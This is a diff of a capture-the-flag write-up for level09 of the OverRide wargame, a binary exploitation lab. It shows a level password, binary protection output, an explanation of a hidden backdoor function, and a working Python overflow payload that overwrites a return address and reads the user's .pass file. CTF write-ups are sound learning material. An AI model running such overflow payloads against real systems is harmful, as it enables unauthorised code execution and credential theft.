@@ -16,7 +16,6 @@ level09@192.168.56.101's password: fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
 
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   /home/users/level09/level09
-level09@OverRide:~$
 ```
 
 The program contains `secret_backdoor()` function which reads in at most 127 characters from `stdin` and stores them into the buffer pointed to by `command`. Then it executes  a command specified in `command` by calling `/bin/sh -c command`,
@@ -82,7 +81,7 @@ By overwritting message length byte and using offset followed by the address of 
 
 
 ## Exploit
-```sh
+```shell
 level09@OverRide:~$ (python -c "import struct; print('\xff'*50 + '\n' + '\x55'*200 + struct.pack('Q', 0x55555555488c))"; echo 'cat /home/users/$(whoami)/.pass') | ./level09
 --------------------------------------------
 |   ~Welcome to l33t-m$n ~    v1337        |
